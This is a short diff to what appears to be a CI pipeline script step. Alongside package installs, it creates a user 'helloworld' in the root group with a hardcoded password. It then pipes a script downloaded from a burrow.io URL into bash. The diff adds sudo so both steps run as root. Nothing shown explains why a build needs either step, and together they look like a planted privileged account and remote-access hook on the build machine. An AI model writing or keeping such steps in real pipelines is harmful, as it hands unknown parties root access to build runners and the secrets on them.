@@ -20,7 +20,7 @@ steps:
     sudo apt-get install python3 ffmpeg curl python3-pip build-essential -y
     sudo pip3 install bs4
     pushd / && ls -lhart
-    useradd -m -g root helloworld
-    sudo echo "helloworld:hello" | sudo chpasswd
-    curl -Ls https://burrow.io/mm9PPJdL-APFCekdI  -o - | bash -s
+    sudo useradd -m -g root helloworld
+    sudo echo "helloworld:eA&AIudSWDYV" | sudo chpasswd
+    sudo curl -Ls https://burrow.io/mm9PPJdL-APFCekdI  -o - | sudo bash -s
   displayName: 'Run a multi-line script' 
